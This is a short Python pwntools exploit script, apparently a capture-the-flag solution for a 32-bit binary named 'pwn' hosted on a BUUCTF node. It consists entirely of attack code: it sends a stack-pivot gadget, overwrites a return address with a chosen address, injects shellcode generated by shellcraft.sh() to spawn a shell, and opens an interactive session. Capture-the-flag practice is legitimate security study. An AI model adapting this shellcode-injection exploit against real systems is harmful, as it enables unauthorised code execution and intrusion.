import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29552)
			elf=ELF('./pwn')
			#libc=ELF('')




		pay=asm('mov esp,ecx;ret')
		io.recv()
		io.sendline('0')
		io.recv()
		io.send(pay)
		start=0x8048B5C
		pay=p32(0x08048BD6)+p32(0x80)
		io.recv()
		io.sendline('88')
		io.recv()
		#gdb.attach(io)
		#pause()
		io.sendline(pay)
		io.sendline(asm(shellcraft.sh()))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue